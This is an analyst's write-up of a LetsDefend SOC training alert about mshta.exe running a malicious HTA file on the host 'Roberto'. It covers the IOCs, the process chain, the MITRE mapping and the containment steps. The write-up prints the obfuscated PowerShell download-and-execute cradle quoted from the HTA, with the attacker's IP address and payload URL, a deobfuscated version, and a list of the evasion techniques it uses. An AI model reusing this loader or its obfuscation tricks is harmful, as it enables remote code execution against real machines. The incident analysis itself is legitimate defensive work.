#team/blue 

**Platform:** LetsDefend  
**Event ID:** 114  
**Rule:** SOC164 - Suspicious Mshta Behavior  
**Date Investigated:** Mar 05, 2022  
**Analyst:** Void  
**Verdict:** True Positive | Contained

---

## Alert Details

|Field|Value|
|---|---|
|Event Time|Mar 05, 2022 10:29 AM|
|Hostname|Roberto|
|IP Address|172.16.17.38|
|Related Binary|mshta.exe|
|Binary Path|C:/Windows/System32/mshta.exe|
|Command Line|C:/Windows/System32/mshta.exe C:/Users/Roberto/Desktop/Ps1.hta|
|MD5 of Ps1.hta|6685c433705f558c5535789234db0e5a|
|EDR Action|Allowed|

---

## Hash and IP Reputation

|Indicator|Source|Result|
|---|---|---|
|6685c433705f558c5535789234db0e5a|VirusTotal|32/61 vendors flagged malicious|
|193.142.58.23|VirusTotal|7/91 vendors flagged malicious or phishing|
|193.142.58.23|AbuseIPDB|49 reports|
|193.142.58.23|LetsDefend Threat Intel|No data|
|http://193.142.58.23/Server.txt|VirusTotal|9/91 vendors flagged malicious or phishing|

> [!danger] IOCs
> 
> - **6685c433705f558c5535789234db0e5a** — Ps1.hta hash. 32/61 vendors confirmed malicious.
> - **193.142.58.23** — Attacker-controlled C2 server. Hosts Server.txt payload.
> - **http://193.142.58.23/Server.txt** — Remote payload URL. Flagged malicious by 9/91 vendors.

---

## Attack Timeline

```
Mar 05, 2022
|
|-- 10:29 AM -- User double-clicks Ps1.hta on Roberto's Desktop
|               explorer.exe spawns mshta.exe — confirms manual user action
|               mshta.exe executes Ps1.hta
|               EDR Action: ALLOWED
|
|-- 10:30 AM -- mshta.exe spawns obfuscated PowerShell command
|               PowerShell reconstructs net.WebClient.DownloadString at runtime
|               Outbound HTTP GET to http://193.142.58.23/Server.txt on port 80
|
|-- 10:30 AM -- Attacker server responds with 404 Not Found
|               Payload delivery failed — Server.txt not available
|               Bidirectional traffic confirmed but C2 payload not retrieved
|
|-- 14:00 PM -- Roberto's machine connects to 172.217.17.100
|-- 19:53 PM -- Roberto's machine connects to 172.217.169.105 (Spring server)
|               No suspicious commands found on Spring server
|               172.217.x.x is Google IP range — likely legitimate traffic
|
|-- 31.03.2022 -- Terminal history logs observed
|                 26 days after initial compromise — unexplained
|                 Possible continued access or scheduled task activity
```

> [!warning] Terminal History Date Discrepancy Command history on Roberto's machine shows entries dated 31.03.2022 — 26 days after the initial compromise on 05.03.2022. This is unexplained. Possible interpretations:
> 
> - Continued attacker access over 26 days via a persistence mechanism not visible in available logs
> - A scheduled task running commands automatically
> 
> This should be escalated for further investigation. Do not dismiss as a logging anomaly.

---

## What is mshta.exe

mshta.exe is a legitimate Windows binary — Microsoft HTML Application Host. Its intended purpose is to execute `.hta` (HTML Application) files which can contain HTML, JavaScript, or VBScript.

> [!info] Why Attackers Use mshta.exe mshta.exe is a LOLBin — Living Off the Land Binary. Because it is a signed, legitimate Windows system binary, many security tools whitelist it by default. Attackers use it to execute malicious HTA files or remote scripts while appearing to run a trusted Windows process. This bypasses application whitelisting controls that would block unknown executables.

---

## Obfuscated PowerShell Command

**Raw command observed:**

```powershell
C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe 
function H1($i) {
    $r = '';
    for ($n = 0; $n -Lt $i.LengtH; $n += 2) {
        $r += [cHar][int]('0x' + $i.Substring($n,2))
    }
    return $r
};
$H2 = (new-object ('{1}{0}{2}' -f'WebCL','net.','ient'));
$H3 = H1 '446f776E';
$H4 = H1 '6C6f';
$H5 = H1 '616473747269';
$H6 = H1 '6E67';
$H7 = $H3+$H4+$H5+$H6;
$H8 = $H2.$H7('http://193.142.58.23/Server.txt');
iEX $H8
```

**Hex decoding:**

|Variable|Hex|Decoded|
|---|---|---|
|H3|446f776E|Down|
|H4|6C6f|lo|
|H5|616473747269|adstri|
|H6|6E67|ng|
|H7 combined|—|DownloadString|

**Deobfuscated intent:**

```powershell
$web = New-Object net.WebClient
$payload = $web.DownloadString('http://193.142.58.23/Server.txt')
IEX $payload
```

> [!danger] Obfuscation Techniques Used
> 
> - **Hex encoding** — function H1 converts hex strings to characters at runtime. DownloadString is never written in plaintext — it is reconstructed character by character
> - **String concatenation obfuscation** — `net.WebClient` is constructed via `-f` format operator: `('{1}{0}{2}' -f'WebCL','net.','ient')` reorders the segments to avoid the plaintext string appearing in static analysis
> - **Mixed case** — `iEX`, `LengtH`, `cHar` — deliberate case mixing to evade case-sensitive string matching rules
> - **IEX in-memory execution** — payload would have executed entirely in memory with no file written to disk

---

## Process Chain

```
explorer.exe
    └── mshta.exe (Ps1.hta)
            └── powershell.exe (obfuscated DownloadString → IEX)
                        └── HTTP GET → 193.142.58.23/Server.txt
                                    └── 404 Not Found — payload delivery failed
```

> [!info] Why explorer.exe as Parent Matters Explorer.exe is the Windows shell process — it launches when a user physically double-clicks a file. Explorer.exe as the parent of mshta.exe confirms a **user manually executed Ps1.hta** from the Desktop.
> 
> If malware had executed mshta.exe automatically, the parent would typically be cmd.exe, wscript.exe, a browser process, or a scheduled task. Explorer.exe as parent is the direct signature of human interaction — the user performed the action, not existing malware.
> 
> This is the answer to the playbook question "Who Performed the Activity?" — **User**, not Malware.

---

## C2 Investigation

**Outbound:** 172.16.17.38 → 193.142.58.23:80 at 10:30 AM  
**Response:** 404 Not Found  
**Inbound:** 193.142.58.23 → 172.16.17.38:80 — confirmed bidirectional traffic

> [!note] Why 404 Does Not Mean No Attack The attacker's server returned 404 — Server.txt was not available at the time of the request. This means payload delivery failed. The attack itself was real and the infrastructure was real — the C2 server was simply offline or the file had been removed by the time the victim connected.
> 
> 404 response = failed payload delivery, not a false positive.

---

## Lateral Movement Investigation

**Connections observed post-compromise:**

- 172.217.17.100 at 14:00 — Google IP range, likely legitimate
- 172.217.169.105 at 19:53 — Spring server, no suspicious commands found

> [!note] Lateral Movement — Not Confirmed Both IPs were investigated. No suspicious commands found on the Spring server. 172.217.x.x is a Google-owned IP range — traffic to these addresses is consistent with normal browser activity. Lateral movement not mapped — no supporting evidence.

---

## Playbook Review — Incorrect Answers

> [!warning] Lessons from Playbook Errors **What Is Suspicious Activity — initial answer: Download, correct answer: Execute** Download is a secondary activity. The primary suspicious activity is mshta.exe executing a malicious HTA file — a LOLBin being used to run unauthorised code. Execute is the correct classification because the alert triggered on execution, not on the download attempt.
> 
> **Who Performed the Activity — initial answer: Malware, correct answer: User** Explorer.exe as the parent process of mshta.exe confirms a user double-clicked Ps1.hta manually. Malware-initiated execution would show a different parent process. The file was on the Desktop — the user physically ran it.

---

## MITRE ATT&CK Mapping

|Tactic|Technique|ID|Evidence|
|---|---|---|---|
|Execution|User Execution: Malicious File|T1204.002|User double-clicked Ps1.hta on Desktop — explorer.exe as parent confirms manual execution|
|Execution|Command and Scripting Interpreter: PowerShell|T1059.001|mshta.exe spawned obfuscated PowerShell to execute DownloadString|
|Defense Evasion|System Binary Proxy Execution: Mshta|T1218.005|mshta.exe used as LOLBin to execute malicious HTA file and bypass application controls|
|Defense Evasion|Obfuscated Files or Information|T1027|Hex-encoded strings, string concatenation reordering, mixed case — all reconstructed at runtime|
|Command and Control|Application Layer Protocol: Web Protocols|T1071.001|Outbound HTTP to 193.142.58.23:80 attempting to retrieve Server.txt|
|Command and Control|Ingress Tool Transfer|T1105|DownloadString attempting to pull Server.txt payload from attacker server|

> [!caution] Mapping Note Lateral movement not mapped — no evidence of successful movement to other internal systems. Spring server investigated and cleared. Persistence not confirmed — terminal history dated 31.03.2022 is a separate open finding that requires further investigation but is not sufficient evidence to map a persistence technique without identifying the mechanism.

---

## Attacker Objective Assessment

> [!note] What the Attacker Achieved
> 
> |Objective|Result|
> |---|---|
> |User Executed Malicious HTA File|Achieved|
> |LOLBin Execution via mshta.exe|Achieved|
> |Obfuscated PowerShell Executed|Achieved|
> |Payload Retrieval from C2|Failed — 404 Not Found|
> |In-Memory Execution via IEX|Failed — payload never retrieved|
> |Lateral Movement|Not confirmed|
> |Persistence|Unconfirmed — 31.03.2022 terminal history unexplained|
> 
> Partial attacker success. Execution chain ran correctly up to C2 contact. Payload delivery failed because Server.txt was unavailable. The attack infrastructure was real and functional — the failure was on the attacker's server side, not a defensive block.

---

## Actions Taken

- Alert classified as True Positive
- Roberto's machine (172.16.17.38) contained
- IOCs blocked at perimeter:
    - 193.142.58.23
- Ps1.hta hash added to blocklist
- Terminal history date discrepancy (31.03.2022) escalated for separate investigation
- Roberto to be interviewed regarding how Ps1.hta arrived on the Desktop

> [!danger] Containment Rationale EDR Action was Allowed. mshta.exe executed successfully. Obfuscated PowerShell ran and contacted the C2 server. Payload delivery failed due to 404 — not due to any defensive control. A second attempt with an active Server.txt would result in full in-memory payload execution. Contain immediately.

---

## Key Learnings

> [!note] Lessons from This Case
> 
> 1. Explorer.exe as parent process means a user physically executed the file — always ask why a particular process is the parent, not just what it is
> 2. mshta.exe is a LOLBin — legitimate Windows binary abused to execute malicious HTA files and bypass application whitelisting
> 3. Hex encoding combined with string concatenation reordering is a multi-layer obfuscation technique — decode each layer separately before reading the intent
> 4. A 404 response from a C2 server means failed payload delivery, not a false positive — the attack was real, the infrastructure was just offline
> 5. True Positive does not require a successful attack — it requires a confirmed real threat regardless of whether the attacker achieved their objective
> 6. Terminal history dates that extend weeks beyond the initial compromise are a persistence indicator — always check for activity beyond the alert window
> 7. IEX combined with DownloadString is the same in-memory execution pattern as IEX with IWR — different method, same objective. Recognise the pattern regardless of which download function is used

---

## References

- [MITRE T1218.005 — Mshta](https://attack.mitre.org/techniques/T1218/005/)
- [MITRE T1059.001 — PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [MITRE T1027 — Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/)
- [MITRE T1204.002 — Malicious File](https://attack.mitre.org/techniques/T1204/002/)
- [MITRE T1105 — Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
- [LOLBAS Project — mshta](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)

---

